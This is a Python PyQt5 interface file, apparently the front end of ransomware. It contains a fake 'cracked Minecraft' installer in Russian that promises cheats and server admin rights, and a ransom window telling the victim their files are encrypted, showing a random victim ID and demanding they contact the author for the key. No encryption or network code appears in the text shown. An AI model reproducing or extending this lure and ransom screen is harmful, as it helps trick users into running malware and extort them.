from PyQt5 import QtCore, QtGui, QtWidgets
import random
ID = random.randint(100000, 999999)


class Ui_Form(object):
    def setupUi(self, Form):
        Form.setObjectName("Form")
        Form.resize(386, 241)
        Form.setStyleSheet("background-color: rgb(0, 255, 0);")
        self.label = QtWidgets.QLabel(Form)
        self.label.setGeometry(QtCore.QRect(30, 20, 331, 111))
        self.label.setStyleSheet("")
        self.label.setObjectName("label")
        self.info_label = QtWidgets.QLabel(Form)
        self.info_label.setGeometry(QtCore.QRect(30, 130, 331, 21))
        self.info_label.setObjectName("info_label")
        self.push_2 = QtWidgets.QPushButton(Form)
        self.push_2.setGeometry(QtCore.QRect(140, 200, 101, 26))
        self.push_2.setStyleSheet("background-color: rgb(0, 255, 255);")
        self.push_2.setObjectName("push_2")
        self.lineEdit = QtWidgets.QLineEdit(Form)
        self.lineEdit.setGeometry(QtCore.QRect(20, 161, 351, 31))
        self.lineEdit.setStyleSheet("background-color: rgb(255, 255, 255);")
        self.lineEdit.setObjectName("lineEdit")

        self.retranslateUi(Form)
        QtCore.QMetaObject.connectSlotsByName(Form)

    def retranslateUi(self, Form):
        global ID
        _translate = QtCore.QCoreApplication.translate
        Form.setWindowTitle(_translate("Form", "Form"))
        self.label.setText(_translate("Form", f"<html><head/><body><p>Ваши файлы на компьютере были зашифрованы</p><p>Для того чтобы получить ключь свяжитесь со мной </p><p>(данные для связи)</p><p>ваш ID {ID}</p><p>(крайне не рекомендую закрывать это окно)</p></body></html>"))
        self.info_label.setText(_translate("Form", "<html><head/><body><p><br/></p></body></html>"))
        self.push_2.setText(_translate("Form", "Продолжить"))


class Ui_installer(object):
    def setupUi(self, installer):
        installer.setObjectName("installer")
        installer.setWindowModality(QtCore.Qt.NonModal)
        installer.resize(291, 211)
        installer.setStyleSheet("background-color: rgb(0, 255, 0);")

        self.front_txt = QtWidgets.QLabel(installer)
        self.front_txt.setGeometry(QtCore.QRect(10, 0, 221, 71))
        self.front_txt.setObjectName("front_txt")

        self.push = QtWidgets.QPushButton(installer)
        self.push.setGeometry(QtCore.QRect(100, 170, 91, 31))
        self.push.setStyleSheet("background-color: rgb(0, 255, 255);")
        self.push.setObjectName("push")

        self.layoutWidget = QtWidgets.QWidget(installer)
        self.layoutWidget.setGeometry(QtCore.QRect(30, 60, 246, 111))
        self.layoutWidget.setObjectName("layoutWidget")

        self.verticalLayout = QtWidgets.QVBoxLayout(self.layoutWidget)
        self.verticalLayout.setContentsMargins(0, 0, 0, 0)
        self.verticalLayout.setObjectName("verticalLayout")

        self.label_2 = QtWidgets.QLabel(self.layoutWidget)
        self.label_2.setObjectName("label_2")
        self.verticalLayout.addWidget(self.label_2)

        self.label_3 = QtWidgets.QLabel(self.layoutWidget)
        self.label_3.setObjectName("label_3")
        self.verticalLayout.addWidget(self.label_3)

        self.label_4 = QtWidgets.QLabel(self.layoutWidget)
        self.label_4.setObjectName("label_4")
        self.verticalLayout.addWidget(self.label_4)

        self.label_5 = QtWidgets.QLabel(self.layoutWidget)
        self.label_5.setObjectName("label_5")
        self.verticalLayout.addWidget(self.label_5)

        self.layoutWidget1 = QtWidgets.QWidget(installer)
        self.layoutWidget1.setGeometry(QtCore.QRect(10, 60, 18, 111))
        self.layoutWidget1.setObjectName("layoutWidget1")

        self.verticalLayout_2 = QtWidgets.QVBoxLayout(self.layoutWidget1)
        self.verticalLayout_2.setContentsMargins(0, 0, 0, 0)
        self.verticalLayout_2.setObjectName("verticalLayout_2")

        self.checkBox = QtWidgets.QCheckBox(self.layoutWidget1)
        self.checkBox.setText("")
        self.checkBox.setObjectName("checkBox")
        self.verticalLayout_2.addWidget(self.checkBox)

        self.checkBox_2 = QtWidgets.QCheckBox(self.layoutWidget1)
        self.checkBox_2.setText("")
        self.checkBox_2.setObjectName("checkBox_2")
        self.verticalLayout_2.addWidget(self.checkBox_2)

        self.checkBox_3 = QtWidgets.QCheckBox(self.layoutWidget1)
        self.checkBox_3.setText("")
        self.checkBox_3.setObjectName("checkBox_3")
        self.verticalLayout_2.addWidget(self.checkBox_3)

        self.checkBox_4 = QtWidgets.QCheckBox(self.layoutWidget1)
        self.checkBox_4.setText("")
        self.checkBox_4.setObjectName("checkBox_4")
        self.verticalLayout_2.addWidget(self.checkBox_4)

        self.retranslateUi(installer)
        QtCore.QMetaObject.connectSlotsByName(installer)

    def retranslateUi(self, installer):
        _translate = QtCore.QCoreApplication.translate
        installer.setWindowTitle(_translate("installer", "Form"))
        self.front_txt.setText(_translate("installer", "<html><head/><body><p><span style=\" font-weight:700; font-style:italic;\">Вас приветствует установщик</span></p><p><span style=\" font-weight:700; font-style:italic;\">взломанного Minecraft</span></p></body></html>"))
        self.push.setText(_translate("installer", "Продолжить"))
        self.label_2.setText(_translate("installer", "<html><head/><body><p>Топ снаряжение</p></body></html>"))
        self.label_3.setText(_translate("installer", "<html><head/><body><p>Чит на дюп</p></body></html>"))
        self.label_4.setText(_translate("installer", "<html><head/><body><p>Мод на бессмертие</p></body></html>"))
        self.label_5.setText(_translate("installer", "<html><head/><body><p>Права администратора на всех серверах</p></body></html>"))
